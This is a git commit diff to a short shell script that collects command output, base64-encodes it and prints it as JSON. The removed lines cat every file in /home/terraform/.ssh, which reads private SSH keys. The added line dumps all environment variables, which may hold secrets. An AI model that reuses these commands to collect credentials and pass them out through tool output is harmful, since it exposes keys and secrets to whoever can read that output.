75f96073f4f9afaf636dd2feab012beb70d6b672
Robert Polasek <robert.polasek@toptal.com>
2020-05-06 14:52:10 -0400

    fix #24

--- cmd2out.sh
+++ cmd2out.sh
@@ -1,12 +1,12 @@
 OUT=my.output
 echo "=================================="  >$OUT 2>&1
-ls -la /home/terraform/.ssh >>$OUT 2>&1
+env >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-cat /home/terraform/.ssh/* >>$OUT 2>&1
+strace -f terraform --version  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-ls -la /home/ubunut/.ssh  >>$OUT 2>&1
+#ls -la /home/ubunut/.ssh  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-ssh -v  git@github.com  >>$OUT 2>&1
+#ssh -v  git@github.com  >>$OUT 2>&1
 
 b64=$(cat $OUT|base64 -w0)
 echo "{ \"out\": \"${b64}\" }"
